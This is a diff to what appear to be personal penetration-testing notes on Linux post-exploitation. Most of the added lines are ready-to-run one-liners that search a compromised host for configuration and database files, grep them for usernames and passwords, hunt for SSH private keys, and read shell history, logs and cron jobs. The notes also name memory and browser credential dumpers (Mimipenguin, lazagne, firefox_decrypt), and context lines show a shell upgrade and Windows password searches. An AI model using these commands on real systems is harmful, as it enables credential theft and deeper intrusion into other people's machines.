@@ -19,5 +19,18 @@ stty raw -echo; fg
 export TERM = xterm
 
 ----------scan files---------
+targets: files - config, database, note, script, cronjob, ssh
+get config files: for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+find user, password from .cnf: for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+database: for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+cronjob: cat /etc/crontab, ls -la /etc/cron.*
+         (format: <min> <hour> <day of month> <month> <day of week> <user> <command>)
+script: 
+ssh: grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
+History, logs: tail -n5 /home/*/.bash*, for i in $(ls /var/log/* 2>/dev/null);do grep <related words with \|>;done
+Memory: Mimipenguin or lazagne
+Browser: firefox_decrypt or lazagne
+         .mozilla/firefox/<ver>.default-release/logins.json
+
 Use tool: start lazagne.exe all
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
